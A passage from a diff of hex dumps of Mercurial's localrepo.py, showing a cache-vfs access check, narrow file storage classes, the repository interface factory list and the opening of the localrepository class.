-0000c700: 6d65 6e74 733a 0a20 2020 2020 2020 2020  ments:.         
-0000c710: 2020 2073 656c 662e 6669 6c65 636f 7069     self.filecopi
-0000c720: 6573 6d6f 6465 203d 2062 2763 6861 6e67  esmode = b'chang
-0000c730: 6573 6574 2d73 6964 6564 6174 6127 0a0a  eset-sidedata'..
-0000c740: 2020 2020 2020 2020 7365 6c66 2e5f 7761          self._wa
-0000c750: 6e74 6564 5f73 6964 6564 6174 6120 3d20  nted_sidedata = 
-0000c760: 7365 7428 290a 2020 2020 2020 2020 7365  set().        se
-0000c770: 6c66 2e5f 7369 6465 6461 7461 5f63 6f6d  lf._sidedata_com
-0000c780: 7075 7465 7273 203d 207b 7d0a 2020 2020  puters = {}.    
-0000c790: 2020 2020 7369 6465 6461 7461 6d6f 642e      sidedatamod.
-0000c7a0: 7365 745f 7369 6465 6461 7461 5f73 7065  set_sidedata_spe
-0000c7b0: 635f 666f 725f 7265 706f 2873 656c 6629  c_for_repo(self)
-0000c7c0: 0a0a 2020 2020 6465 6620 5f67 6574 7666  ..    def _getvf
-0000c7d0: 7377 6172 6428 7365 6c66 2c20 6f72 6967  sward(self, orig
-0000c7e0: 6675 6e63 293a 0a20 2020 2020 2020 2022  func):.        "
-0000c7f0: 2222 6275 696c 6420 6120 7761 7264 2066  ""build a ward f
-0000c800: 6f72 2073 656c 662e 7666 7322 2222 0a20  or self.vfs""". 
-0000c810: 2020 2020 2020 2072 7265 6620 3d20 7765         rref = we
-0000c820: 616b 7265 662e 7265 6628 7365 6c66 290a  akref.ref(self).
-0000c830: 0a20 2020 2020 2020 2064 6566 2063 6865  .        def che
-0000c840: 636b 7666 7328 7061 7468 2c20 6d6f 6465  ckvfs(path, mode
-0000c850: 3d4e 6f6e 6529 3a0a 2020 2020 2020 2020  =None):.        
-0000c860: 2020 2020 7265 7420 3d20 6f72 6967 6675      ret = origfu
-0000c870: 6e63 2870 6174 682c 206d 6f64 653d 6d6f  nc(path, mode=mo
-0000c880: 6465 290a 2020 2020 2020 2020 2020 2020  de).            
-0000c890: 7265 706f 203d 2072 7265 6628 290a 2020  repo = rref().  
-0000c8a0: 2020 2020 2020 2020 2020 6966 2028 0a20            if (. 
-0000c8b0: 2020 2020 2020 2020 2020 2020 2020 2072                 r
-0000c8c0: 6570 6f20 6973 204e 6f6e 650a 2020 2020  epo is None.    
-0000c8d0: 2020 2020 2020 2020 2020 2020 6f72 206e              or n
-0000c8e0: 6f74 2075 7469 6c2e 7361 6665 6861 7361  ot util.safehasa
-0000c8f0: 7474 7228 7265 706f 2c20 6227 5f77 6c6f  ttr(repo, b'_wlo
-0000c900: 636b 7265 6627 290a 2020 2020 2020 2020  ckref').        
-0000c910: 2020 2020 2020 2020 6f72 206e 6f74 2075          or not u
-0000c920: 7469 6c2e 7361 6665 6861 7361 7474 7228  til.safehasattr(
-0000c930: 7265 706f 2c20 6227 5f6c 6f63 6b72 6566  repo, b'_lockref
-0000c940: 2729 0a20 2020 2020 2020 2020 2020 2029  ').            )
-0000c950: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
-0000c960: 2020 7265 7475 726e 0a20 2020 2020 2020    return.       
-0000c970: 2020 2020 2069 6620 6d6f 6465 2069 6e20       if mode in 
-0000c980: 284e 6f6e 652c 2062 2772 272c 2062 2772  (None, b'r', b'r
-0000c990: 6227 293a 0a20 2020 2020 2020 2020 2020  b'):.           
-0000c9a0: 2020 2020 2072 6574 7572 6e0a 2020 2020       return.    
-0000c9b0: 2020 2020 2020 2020 6966 2070 6174 682e          if path.
-0000c9c0: 7374 6172 7473 7769 7468 2872 6570 6f2e  startswith(repo.
-0000c9d0: 7061 7468 293a 0a20 2020 2020 2020 2020  path):.         
-0000c9e0: 2020 2020 2020 2023 2074 7275 6e63 6174         # truncat
-0000c9f0: 6520 6e61 6d65 2072 656c 6174 6976 6520  e name relative 
-0000ca00: 746f 2074 6865 2072 6570 6f73 6974 6f72  to the repositor
-0000ca10: 7920 282e 6867 290a 2020 2020 2020 2020  y (.hg).        
-0000ca20: 2020 2020 2020 2020 7061 7468 203d 2070          path = p
-0000ca30: 6174 685b 6c65 6e28 7265 706f 2e70 6174  ath[len(repo.pat
-0000ca40: 6829 202b 2031 203a 5d0a 2020 2020 2020  h) + 1 :].      
-0000ca50: 2020 2020 2020 6966 2070 6174 682e 7374        if path.st
-0000ca60: 6172 7473 7769 7468 2862 2763 6163 6865  artswith(b'cache
-0000ca70: 2f27 293a 0a20 2020 2020 2020 2020 2020  /'):.           
-0000ca80: 2020 2020 206d 7367 203d 2062 2761 6363       msg = b'acc
-0000ca90: 6573 7369 6e67 2063 6163 6865 2077 6974  essing cache wit
-0000caa0: 6820 7666 7320 696e 7374 6561 6420 6f66  h vfs instead of
-0000cab0: 2063 6163 6865 7666 733a 2022 2573 2227   cachevfs: "%s"'
-0000cac0: 0a20 2020 2020 2020 2020 2020 2020 2020  .               
-0000cad0: 2072 6570 6f2e 7569 2e64 6576 656c 7761   repo.ui.develwa
-0000cae0: 726e 286d 7367 2025 2070 6174 682c 2073  rn(msg % path, s
-0000caf0: 7461 636b 6c65 7665 6c3d 332c 2063 6f6e  tacklevel=3, con
-0000cb00: 6669 673d 6222 6361 6368 652d 7666 7322  fig=b"cache-vfs"
-0000cb10: 290a 2020 2020 2020 2020 2020 2020 2320  ).            # 
-0000cb20: 7061 7468 2070 7265 6669 7865 7320 636f  path prefixes co
-0000cb30: 7665 7265 6420 6279 2027 6c6f 636b 270a  vered by 'lock'.
-0000cb40: 2020 2020 2020 2020 2020 2020 7666 735f              vfs_
-0000cb50: 7061 7468 5f70 7265 6669 7865 7320 3d20  path_prefixes = 
-0000cb60: 280a 2020 2020 2020 2020 2020 2020 2020  (.              
-0000cb70: 2020 6227 6a6f 7572 6e61 6c2e 272c 0a20    b'journal.',. 
-0000cb80: 2020 2020 2020 2020 2020 2020 2020 2062                 b
-0000cb90: 2775 6e64 6f2e 272c 0a20 2020 2020 2020  'undo.',.       
-0000cba0: 2020 2020 2020 2020 2062 2773 7472 6970           b'strip
-0000cbb0: 2d62 6163 6b75 702f 272c 0a20 2020 2020  -backup/',.     
-0000cbc0: 2020 2020 2020 2020 2020 2062 2763 6163             b'cac
-0000cbd0: 6865 2f27 2c0a 2020 2020 2020 2020 2020  he/',.          
-0000cbe0: 2020 290a 2020 2020 2020 2020 2020 2020    ).            
-0000cbf0: 6966 2061 6e79 2870 6174 682e 7374 6172  if any(path.star
-0000cc00: 7473 7769 7468 2870 7265 6669 7829 2066  tswith(prefix) f
-0000cc10: 6f72 2070 7265 6669 7820 696e 2076 6673  or prefix in vfs
-0000cc20: 5f70 6174 685f 7072 6566 6978 6573 293a  _path_prefixes):
+0000a450: 2020 7265 7475 726e 2066 696c 656c 6f67    return filelog
+0000a460: 2e66 696c 656c 6f67 2873 656c 662e 7376  .filelog(self.sv
+0000a470: 6673 2c20 7061 7468 290a 0a0a 4069 6e74  fs, path)...@int
+0000a480: 6572 6661 6365 7574 696c 2e69 6d70 6c65  erfaceutil.imple
+0000a490: 6d65 6e74 6572 2872 6570 6f73 6974 6f72  menter(repositor
+0000a4a0: 792e 696c 6f63 616c 7265 706f 7369 746f  y.ilocalreposito
+0000a4b0: 7279 6669 6c65 7374 6f72 6167 6529 0a63  ryfilestorage).c
+0000a4c0: 6c61 7373 2072 6576 6c6f 676e 6172 726f  lass revlognarro
+0000a4d0: 7766 696c 6573 746f 7261 6765 3a0a 2020  wfilestorage:.  
+0000a4e0: 2020 2222 2246 696c 6520 7374 6f72 6167    """File storag
+0000a4f0: 6520 7768 656e 2075 7369 6e67 2072 6576  e when using rev
+0000a500: 6c6f 6773 2061 6e64 206e 6172 726f 7720  logs and narrow 
+0000a510: 6669 6c65 732e 2222 220a 0a20 2020 2064  files."""..    d
+0000a520: 6566 2066 696c 6528 7365 6c66 2c20 7061  ef file(self, pa
+0000a530: 7468 293a 0a20 2020 2020 2020 2069 6620  th):.        if 
+0000a540: 7061 7468 2e73 7461 7274 7377 6974 6828  path.startswith(
+0000a550: 6227 2f27 293a 0a20 2020 2020 2020 2020  b'/'):.         
+0000a560: 2020 2070 6174 6820 3d20 7061 7468 5b31     path = path[1
+0000a570: 3a5d 0a0a 2020 2020 2020 2020 7265 7475  :]..        retu
+0000a580: 726e 2066 696c 656c 6f67 2e6e 6172 726f  rn filelog.narro
+0000a590: 7766 696c 656c 6f67 2873 656c 662e 7376  wfilelog(self.sv
+0000a5a0: 6673 2c20 7061 7468 2c20 7365 6c66 2e5f  fs, path, self._
+0000a5b0: 7374 6f72 656e 6172 726f 776d 6174 6368  storenarrowmatch
+0000a5c0: 290a 0a0a 6465 6620 6d61 6b65 6669 6c65  )...def makefile
+0000a5d0: 7374 6f72 6167 6528 7265 7175 6972 656d  storage(requirem
+0000a5e0: 656e 7473 2c20 6665 6174 7572 6573 2c20  ents, features, 
+0000a5f0: 2a2a 6b77 6172 6773 293a 0a20 2020 2022  **kwargs):.    "
+0000a600: 2222 5072 6f64 7563 6520 6120 7479 7065  ""Produce a type
+0000a610: 2063 6f6e 666f 726d 696e 6720 746f 2060   conforming to `
+0000a620: 6069 6c6f 6361 6c72 6570 6f73 6974 6f72  `ilocalrepositor
+0000a630: 7966 696c 6573 746f 7261 6765 6060 2e22  yfilestorage``."
+0000a640: 2222 0a20 2020 2066 6561 7475 7265 732e  "".    features.
+0000a650: 6164 6428 7265 706f 7369 746f 7279 2e52  add(repository.R
+0000a660: 4550 4f5f 4645 4154 5552 455f 5245 564c  EPO_FEATURE_REVL
+0000a670: 4f47 5f46 494c 455f 5354 4f52 4147 4529  OG_FILE_STORAGE)
+0000a680: 0a20 2020 2066 6561 7475 7265 732e 6164  .    features.ad
+0000a690: 6428 7265 706f 7369 746f 7279 2e52 4550  d(repository.REP
+0000a6a0: 4f5f 4645 4154 5552 455f 5354 5245 414d  O_FEATURE_STREAM
+0000a6b0: 5f43 4c4f 4e45 290a 0a20 2020 2069 6620  _CLONE)..    if 
+0000a6c0: 7265 7175 6972 656d 656e 7473 6d6f 642e  requirementsmod.
+0000a6d0: 4e41 5252 4f57 5f52 4551 5549 5245 4d45  NARROW_REQUIREME
+0000a6e0: 4e54 2069 6e20 7265 7175 6972 656d 656e  NT in requiremen
+0000a6f0: 7473 3a0a 2020 2020 2020 2020 7265 7475  ts:.        retu
+0000a700: 726e 2072 6576 6c6f 676e 6172 726f 7766  rn revlognarrowf
+0000a710: 696c 6573 746f 7261 6765 0a20 2020 2065  ilestorage.    e
+0000a720: 6c73 653a 0a20 2020 2020 2020 2072 6574  lse:.        ret
+0000a730: 7572 6e20 7265 766c 6f67 6669 6c65 7374  urn revlogfilest
+0000a740: 6f72 6167 650a 0a0a 2320 4c69 7374 206f  orage...# List o
+0000a750: 6620 7265 706f 7369 746f 7279 2069 6e74  f repository int
+0000a760: 6572 6661 6365 7320 616e 6420 6661 6374  erfaces and fact
+0000a770: 6f72 7920 6675 6e63 7469 6f6e 7320 666f  ory functions fo
+0000a780: 7220 7468 656d 2e20 4561 6368 0a23 2077  r them. Each.# w
+0000a790: 696c 6c20 6265 2063 616c 6c65 6420 696e  ill be called in
+0000a7a0: 206f 7264 6572 2064 7572 696e 6720 6060   order during ``
+0000a7b0: 6d61 6b65 6c6f 6361 6c72 6570 6f73 6974  makelocalreposit
+0000a7c0: 6f72 7928 2960 6020 746f 2069 7465 7261  ory()`` to itera
+0000a7d0: 7469 7665 6c79 0a23 2064 6572 6976 6520  tively.# derive 
+0000a7e0: 7468 6520 6669 6e61 6c20 7479 7065 2066  the final type f
+0000a7f0: 6f72 2061 206c 6f63 616c 2072 6570 6f73  or a local repos
+0000a800: 6974 6f72 7920 696e 7374 616e 6365 2e20  itory instance. 
+0000a810: 5765 2063 6170 7475 7265 2074 6865 0a23  We capture the.#
+0000a820: 2066 756e 6374 696f 6e20 6173 2061 206c   function as a l
+0000a830: 616d 6264 6120 736f 2077 6520 646f 6e27  ambda so we don'
+0000a840: 7420 686f 6c64 2061 2072 6566 6572 656e  t hold a referen
+0000a850: 6365 2061 6e64 2074 6865 206d 6f64 756c  ce and the modul
+0000a860: 652d 6c65 7665 6c0a 2320 6675 6e63 7469  e-level.# functi
+0000a870: 6f6e 7320 6361 6e20 6265 2077 7261 7070  ons can be wrapp
+0000a880: 6564 2e0a 5245 504f 5f49 4e54 4552 4641  ed..REPO_INTERFA
+0000a890: 4345 5320 3d20 5b0a 2020 2020 2872 6570  CES = [.    (rep
+0000a8a0: 6f73 6974 6f72 792e 696c 6f63 616c 7265  ository.ilocalre
+0000a8b0: 706f 7369 746f 7279 6d61 696e 2c20 6c61  positorymain, la
+0000a8c0: 6d62 6461 3a20 6d61 6b65 6d61 696e 292c  mbda: makemain),
+0000a8d0: 0a20 2020 2028 7265 706f 7369 746f 7279  .    (repository
+0000a8e0: 2e69 6c6f 6361 6c72 6570 6f73 6974 6f72  .ilocalrepositor
+0000a8f0: 7966 696c 6573 746f 7261 6765 2c20 6c61  yfilestorage, la
+0000a900: 6d62 6461 3a20 6d61 6b65 6669 6c65 7374  mbda: makefilest
+0000a910: 6f72 6167 6529 2c0a 5d0a 0a0a 4069 6e74  orage),.]...@int
+0000a920: 6572 6661 6365 7574 696c 2e69 6d70 6c65  erfaceutil.imple
+0000a930: 6d65 6e74 6572 2872 6570 6f73 6974 6f72  menter(repositor
+0000a940: 792e 696c 6f63 616c 7265 706f 7369 746f  y.ilocalreposito
+0000a950: 7279 6d61 696e 290a 636c 6173 7320 6c6f  rymain).class lo
+0000a960: 6361 6c72 6570 6f73 6974 6f72 793a 0a20  calrepository:. 
+0000a970: 2020 2022 2222 4d61 696e 2063 6c61 7373     """Main class
+0000a980: 2066 6f72 2072 6570 7265 7365 6e74 696e   for representin
+0000a990: 6720 6c6f 6361 6c20 7265 706f 7369 746f  g local reposito
+0000a9a0: 7269 6573 2e0a 0a20 2020 2041 6c6c 206c  ries...    All l
+0000a9b0: 6f63 616c 2072 6570 6f73 6974 6f72 6965  ocal repositorie
+0000a9c0: 7320 6172 6520 696e 7374 616e 6365 7320  s are instances 
+0000a9d0: 6f66 2074 6869 7320 636c 6173 732e 0a0a  of this class...
+0000a9e0: 2020 2020 436f 6e73 7472 7563 7465 6420      Constructed 
+0000a9f0: 6f6e 2069 7473 206f 776e 2c20 696e 7374  on its own, inst
+0000aa00: 616e 6365 7320 6f66 2074 6869 7320 636c  ances of this cl
+0000aa10: 6173 7320 6172 6520 6e6f 7420 7573 6162  ass are not usab
+0000aa20: 6c65 2061 730a 2020 2020 7265 706f 7369  le as.    reposi
+0000aa30: 746f 7279 206f 626a 6563 7473 2e20 546f  tory objects. To
+0000aa40: 206f 6274 6169 6e20 6120 7573 6162 6c65   obtain a usable
+0000aa50: 2072 6570 6f73 6974 6f72 7920 6f62 6a65   repository obje
+0000aa60: 6374 2c20 6361 6c6c 0a20 2020 2060 6068  ct, call.    ``h
+0000aa70: 672e 7265 706f 7369 746f 7279 2829 6060  g.repository()``
+0000aa80: 2c20 6060 6c6f 6361 6c72 6570 6f2e 696e  , ``localrepo.in
+0000aa90: 7374 616e 6365 2829 6060 2c20 6f72 0a20  stance()``, or. 
+0000aaa0: 2020 2060 606c 6f63 616c 7265 706f 2e6d     ``localrepo.m
+0000aab0: 616b 656c 6f63 616c 7265 706f 7369 746f  akelocalreposito
+0000aac0: 7279 2829 6060 2e20 5468 6520 6c61 7474  ry()``. The latt
+0000aad0: 6572 2069 7320 7468 6520 6c6f 7765 7374  er is the lowest
+0000aae0: 2d6c 6576 656c 2e0a 2020 2020 6060 696e  -level..    ``in
+0000aaf0: 7374 616e 6365 2829 6060 2061 6464 7320  stance()`` adds 
+0000ab00: 7375 7070 6f72 7420 666f 7220 6372 6561  support for crea
+0000ab10: 7469 6e67 206e 6577 2072 6570 6f73 6974  ting new reposit
+0000ab20: 6f72 6965 732e 0a20 2020 2060 6068 672e  ories..    ``hg.
+0000ab30: 7265 706f 7369 746f 7279 2829 6060 2061  repository()`` a
+0000ab40: 6464 7320 6d6f 7265 2065 7874 656e 7369  dds more extensi
+0000ab50: 6f6e 2069 6e74 6567 7261 7469 6f6e 2c20  on integration, 
+0000ab60: 696e 636c 7564 696e 6720 6361 6c6c 696e  including callin
+0000ab70: 670a 2020 2020 6060 7265 706f 7365 7475  g.    ``reposetu
+0000ab80: 7028 2960 602e 2047 656e 6572 616c 6c79  p()``. Generally
+0000ab90: 2073 7065 616b 696e 672c 2060 6068 672e   speaking, ``hg.
+0000aba0: 7265 706f 7369 746f 7279 2829 6060 2073  repository()`` s
+0000abb0: 686f 756c 6420 6265 0a20 2020 2075 7365  hould be.    use
+0000abc0: 642e 0a20 2020 2022 2222 0a0a 2020 2020  d..    """..    
+0000abd0: 5f62 6173 6573 7570 706f 7274 6564 203d  _basesupported =
+0000abe0: 207b 0a20 2020 2020 2020 2072 6571 7569   {.        requi
+0000abf0: 7265 6d65 6e74 736d 6f64 2e41 5243 4849  rementsmod.ARCHI
+0000ac00: 5645 445f 5048 4153 455f 5245 5155 4952  VED_PHASE_REQUIR
+0000ac10: 454d 454e 542c 0a20 2020 2020 2020 2072  EMENT,.        r
+0000ac20: 6571 7569 7265 6d65 6e74 736d 6f64 2e42  equirementsmod.B
+0000ac30: 4f4f 4b4d 4152 4b53 5f49 4e5f 5354 4f52  OOKMARKS_IN_STOR
+0000ac40: 455f 5245 5155 4952 454d 454e 542c 0a20  E_REQUIREMENT,. 
+0000ac50: 2020 2020 2020 2072 6571 7569 7265 6d65         requireme
+0000ac60: 6e74 736d 6f64 2e43 4841 4e47 454c 4f47  ntsmod.CHANGELOG
+0000ac70: 5632 5f52 4551 5549 5245 4d45 4e54 2c0a  V2_REQUIREMENT,.
+0000ac80: 2020 2020 2020 2020 7265 7175 6972 656d          requirem
+0000ac90: 656e 7473 6d6f 642e 434f 5049 4553 5344  entsmod.COPIESSD
+0000aca0: 435f 5245 5155 4952 454d 454e 542c 0a20  C_REQUIREMENT,. 
+0000acb0: 2020 2020 2020 2072 6571 7569 7265 6d65         requireme
+0000acc0: 6e74 736d 6f64 2e44 4952 5354 4154 455f  ntsmod.DIRSTATE_
+0000acd0: 5452 4143 4b45 445f 4849 4e54 5f56 312c  TRACKED_HINT_V1,
+0000ace0: 0a20 2020 2020 2020 2072 6571 7569 7265  .        require
+0000acf0: 6d65 6e74 736d 6f64 2e44 4952 5354 4154  mentsmod.DIRSTAT
+0000ad00: 455f 5632 5f52 4551 5549 5245 4d45 4e54  E_V2_REQUIREMENT
+0000ad10: 2c0a 2020 2020 2020 2020 7265 7175 6972  ,.        requir
+0000ad20: 656d 656e 7473 6d6f 642e 444f 5445 4e43  ementsmod.DOTENC
+0000ad30: 4f44 455f 5245 5155 4952 454d 454e 542c  ODE_REQUIREMENT,
+0000ad40: 0a20 2020 2020 2020 2072 6571 7569 7265  .        require
+0000ad50: 6d65 6e74 736d 6f64 2e46 4e43 4143 4845  mentsmod.FNCACHE
+0000ad60: 5f52 4551 5549 5245 4d45 4e54 2c0a 2020  _REQUIREMENT,.  
+0000ad70: 2020 2020 2020 7265 7175 6972 656d 656e        requiremen
+0000ad80: 7473 6d6f 642e 4745 4e45 5241 4c44 454c  tsmod.GENERALDEL
+0000ad90: 5441 5f52 4551 5549 5245 4d45 4e54 2c0a  TA_REQUIREMENT,.
+0000ada0: 2020 2020 2020 2020 7265 7175 6972 656d          requirem
+0000adb0: 656e 7473 6d6f 642e 494e 5445 524e 414c  entsmod.INTERNAL
+0000adc0: 5f50 4841 5345 5f52 4551 5549 5245 4d45  _PHASE_REQUIREME
+0000add0: 4e54 2c0a 2020 2020 2020 2020 7265 7175  NT,.        requ
+0000ade0: 6972 656d 656e 7473 6d6f 642e 4e4f 4445  irementsmod.NODE
+0000adf0: 4d41 505f 5245 5155 4952 454d 454e 542c  MAP_REQUIREMENT,
+0000ae00: 0a20 2020 2020 2020 2072 6571 7569 7265  .        require
+0000ae10: 6d65 6e74 736d 6f64 2e52 454c 4154 4956  mentsmod.RELATIV
+0000ae20: 455f 5348 4152 4544 5f52 4551 5549 5245  E_SHARED_REQUIRE
+0000ae30: 4d45 4e54 2c0a 2020 2020 2020 2020 7265  MENT,.        re
+0000ae40: 7175 6972 656d 656e 7473 6d6f 642e 5245  quirementsmod.RE
+0000ae50: 564c 4f47 5631 5f52 4551 5549 5245 4d45  VLOGV1_REQUIREME
+0000ae60: 4e54 2c0a 2020 2020 2020 2020 7265 7175  NT,.        requ
+0000ae70: 6972 656d 656e 7473 6d6f 642e 5245 564c  irementsmod.REVL
+0000ae80: 4f47 5632 5f52 4551 5549 5245 4d45 4e54  OGV2_REQUIREMENT
+0000ae90: 2c0a 2020 2020 2020 2020 7265 7175 6972  ,.        requir
+0000aea0: 656d 656e 7473 6d6f 642e 5348 4152 4544  ementsmod.SHARED
+0000aeb0: 5f52 4551 5549 5245 4d45 4e54 2c0a 2020  _REQUIREMENT,.  
+0000aec0: 2020 2020 2020 7265 7175 6972 656d 656e        requiremen
+0000aed0: 7473 6d6f 642e 5348 4152 4553 4146 455f  tsmod.SHARESAFE_
+0000aee0: 5245 5155 4952 454d 454e 542c 0a20 2020  REQUIREMENT,.   
+0000aef0: 2020 2020 2072 6571 7569 7265 6d65 6e74       requirement
+0000af00: 736d 6f64 2e53 5041 5253 455f 5245 5155  smod.SPARSE_REQU
+0000af10: 4952 454d 454e 542c 0a20 2020 2020 2020  IREMENT,.       
+0000af20: 2072 6571 7569 7265 6d65 6e74 736d 6f64   requirementsmod
+0000af30: 2e53 5041 5253 4552 4556 4c4f 475f 5245  .SPARSEREVLOG_RE
+0000af40: 5155 4952 454d 454e 542c 0a20 2020 2020  QUIREMENT,.     
+0000af50: 2020 2072 6571 7569 7265 6d65 6e74 736d     requirementsm
+0000af60: 6f64 2e53 544f 5245 5f52 4551 5549 5245  od.STORE_REQUIRE
+0000af70: 4d45 4e54 2c0a 2020 2020 2020 2020 7265  MENT,.        re
+0000af80: 7175 6972 656d 656e 7473 6d6f 642e 5452  quirementsmod.TR
+0000af90: 4545 4d41 4e49 4645 5354 5f52 4551 5549  EEMANIFEST_REQUI
+0000afa0: 5245 4d45 4e54 2c0a 2020 2020 7d0a 0a20  REMENT,.    }.. 
+0000afb0: 2020 2023 206c 6973 7420 6f66 2070 7265     # list of pre
+0000afc0: 6669 7820 666f 7220 6669 6c65 2077 6869  fix for file whi
+0000afd0: 6368 2063 616e 2062 6520 7772 6974 7465  ch can be writte
+0000afe0: 6e20 7769 7468 6f75 7420 2777 6c6f 636b  n without 'wlock
+0000aff0: 270a 2020 2020 2320 4578 7465 6e73 696f  '.    # Extensio
+0000b000: 6e73 2073 686f 756c 6420 6578 7465 6e64  ns should extend
+0000b010: 2074 6869 7320 6c69 7374 2077 6865 6e20   this list when 
+0000b020: 6e65 6564 6564 0a20 2020 205f 776c 6f63  needed.    _wloc
+0000b030: 6b66 7265 6570 7265 6669 7820 3d20 7b0a  kfreeprefix = {.
+0000b040: 2020 2020 2020 2020 2320 5765 206d 6967          # We mig
+0000b050: 6820 636f 6e73 6964 6572 2072 6571 7569  h consider requi
+0000b060: 7269 6e67 2027 776c 6f63 6b27 2066 6f72  ring 'wlock' for
+0000b070: 2074 6865 206e 6578 740a 2020 2020 2020   the next.      
+0000b080: 2020 2320 7477 6f2c 2062 7574 2070 7265    # two, but pre
+0000b090: 7474 7920 6d75 6368 2061 6c6c 2074 6865  tty much all the
+0000b0a0: 2065 7869 7374 696e 6720 636f 6465 2061   existing code a
+0000b0b0: 7373 756d 650a 2020 2020 2020 2020 2320  ssume.        # 
+0000b0c0: 776c 6f63 6b20 6973 206e 6f74 206e 6565  wlock is not nee
+0000b0d0: 6465 6420 736f 2077 6520 6b65 6570 2074  ded so we keep t
+0000b0e0: 6865 6d20 6578 636c 7564 6564 2066 6f72  hem excluded for
+0000b0f0: 0a20 2020 2020 2020 2023 206e 6f77 2e0a  .        # now..
+0000b100: 2020 2020 2020 2020 6227 6867 7263 272c          b'hgrc',
+0000b110: 0a20 2020 2020 2020 2062 2772 6571 7569  .        b'requi
+0000b120: 7265 7327 2c0a 2020 2020 2020 2020 2320  res',.        # 
+0000b130: 5858 5820 6361 6368 6520 6973 2061 2063  XXX cache is a c
+0000b140: 6f6d 706c 6963 6174 6765 6420 6275 7369  omplicatged busi
+0000b150: 6e65 7373 2073 6f6d 656f 6e65 0a20 2020  ness someone.   
+0000b160: 2020 2020 2023 2073 686f 756c 6420 696e       # should in
+0000b170: 7665 7374 6967 6174 6520 7468 6973 2069  vestigate this i
+0000b180: 6e20 6465 7074 6820 6174 2073 6f6d 6520  n depth at some 
+0000b190: 706f 696e 740a 2020 2020 2020 2020 6227  point.        b'
+0000b1a0: 6361 6368 652f 272c 0a20 2020 2020 2020  cache/',.       
+0000b1b0: 2023 2058 5858 2062 6973 6563 7420 7761   # XXX bisect wa
+0000b1c0: 7320 7374 696c 6c20 6120 6269 7420 746f  s still a bit to
+0000b1d0: 6f20 6d65 7373 7920 6174 2074 6865 2074  o messy at the t
+0000b1e0: 696d 650a 2020 2020 2020 2020 2320 7468  ime.        # th
+0000b1f0: 6973 2063 6861 6e67 6573 6574 2077 6173  is changeset was
+0000b200: 2069 6e74 726f 6475 6365 642e 2053 6f6d   introduced. Som
+0000b210: 656f 6e65 2073 686f 756c 6420 6669 780a  eone should fix.
+0000b220: 2020 2020 2020 2020 2320 7468 6520 7265          # the re
+0000b230: 6d61 696e 6967 2062 6974 2061 6e64 2064  mainig bit and d
+0000b240: 726f 7020 7468 6973 206c 696e 650a 2020  rop this line.  
+0000b250: 2020 2020 2020 6227 6269 7365 6374 2e73        b'bisect.s
+0000b260: 7461 7465 272c 0a20 2020 207d 0a0a 2020  tate',.    }..  
+0000b270: 2020 6465 6620 5f5f 696e 6974 5f5f 280a    def __init__(.
+0000b280: 2020 2020 2020 2020 7365 6c66 2c0a 2020          self,.  
+0000b290: 2020 2020 2020 6261 7365 7569 2c0a 2020        baseui,.  
+0000b2a0: 2020 2020 2020 7569 2c0a 2020 2020 2020        ui,.      
+0000b2b0: 2020 6f72 6967 726f 6f74 3a20 6279 7465    origroot: byte
+0000b2c0: 732c 0a20 2020 2020 2020 2077 6469 7276  s,.        wdirv
+0000b2d0: 6673 3a20 7666 736d 6f64 2e76 6673 2c0a  fs: vfsmod.vfs,.
+0000b2e0: 2020 2020 2020 2020 6867 7666 733a 2076          hgvfs: v
+0000b2f0: 6673 6d6f 642e 7666 732c 0a20 2020 2020  fsmod.vfs,.     
+0000b300: 2020 2072 6571 7569 7265 6d65 6e74 732c     requirements,
+0000b310: 0a20 2020 2020 2020 2073 7570 706f 7274  .        support
+0000b320: 6564 7265 7175 6972 656d 656e 7473 2c0a  edrequirements,.
+0000b330: 2020 2020 2020 2020 7368 6172 6564 7061          sharedpa
+0000b340: 7468 3a20 6279 7465 732c 0a20 2020 2020  th: bytes,.     
+0000b350: 2020 2073 746f 7265 2c0a 2020 2020 2020     store,.      
+0000b360: 2020 6361 6368 6576 6673 3a20 7666 736d    cachevfs: vfsm
+0000b370: 6f64 2e76 6673 2c0a 2020 2020 2020 2020  od.vfs,.        
+0000b380: 7763 6163 6865 7666 733a 2076 6673 6d6f  wcachevfs: vfsmo
+0000b390: 642e 7666 732c 0a20 2020 2020 2020 2066  d.vfs,.        f
+0000b3a0: 6561 7475 7265 732c 0a20 2020 2020 2020  eatures,.       
+0000b3b0: 2069 6e74 656e 7473 3d4e 6f6e 652c 0a20   intents=None,. 
+0000b3c0: 2020 2029 3a0a 2020 2020 2020 2020 2222     ):.        ""
+0000b3d0: 2243 7265 6174 6520 6120 6e65 7720 6c6f  "Create a new lo
+0000b3e0: 6361 6c20 7265 706f 7369 746f 7279 2069  cal repository i
+0000b3f0: 6e73 7461 6e63 652e 0a0a 2020 2020 2020  nstance...      
+0000b400: 2020 4d6f 7374 2063 616c 6c65 7273 2073    Most callers s
+0000b410: 686f 756c 6420 7573 6520 6060 6867 2e72  hould use ``hg.r
+0000b420: 6570 6f73 6974 6f72 7928 2960 602c 2060  epository()``, `
+0000b430: 606c 6f63 616c 7265 706f 2e69 6e73 7461  `localrepo.insta
+0000b440: 6e63 6528 2960 602c 0a20 2020 2020 2020  nce()``,.       
+0000b450: 206f 7220 6060 6c6f 6361 6c72 6570 6f2e   or ``localrepo.
+0000b460: 6d61 6b65 6c6f 6361 6c72 6570 6f73 6974  makelocalreposit
+0000b470: 6f72 7928 2960 6020 666f 7220 6f62 7461  ory()`` for obta
+0000b480: 696e 696e 6720 6120 6e65 7720 7265 706f  ining a new repo
+0000b490: 7369 746f 7279 0a20 2020 2020 2020 206f  sitory.        o
+0000b4a0: 626a 6563 742e 0a0a 2020 2020 2020 2020  bject...        
+0000b4b0: 4172 6775 6d65 6e74 733a 0a0a 2020 2020  Arguments:..    
+0000b4c0: 2020 2020 6261 7365 7569 0a20 2020 2020      baseui.     
+0000b4d0: 2020 2020 2020 6060 7569 2e75 6960 6020        ``ui.ui`` 
+0000b4e0: 696e 7374 616e 6365 2074 6861 7420 6060  instance that ``
+0000b4f0: 7569 6060 2061 7267 756d 656e 7420 7761  ui`` argument wa
+0000b500: 7320 6261 7365 6420 6f66 6620 6f66 2e0a  s based off of..
+0000b510: 0a20 2020 2020 2020 2075 690a 2020 2020  .        ui.    
+0000b520: 2020 2020 2020 2060 6075 692e 7569 6060         ``ui.ui``
+0000b530: 2069 6e73 7461 6e63 6520 666f 7220 7573   instance for us
+0000b540: 6520 6279 2074 6865 2072 6570 6f73 6974  e by the reposit
+0000b550: 6f72 792e 0a0a 2020 2020 2020 2020 6f72  ory...        or
+0000b560: 6967 726f 6f74 0a20 2020 2020 2020 2020  igroot.         
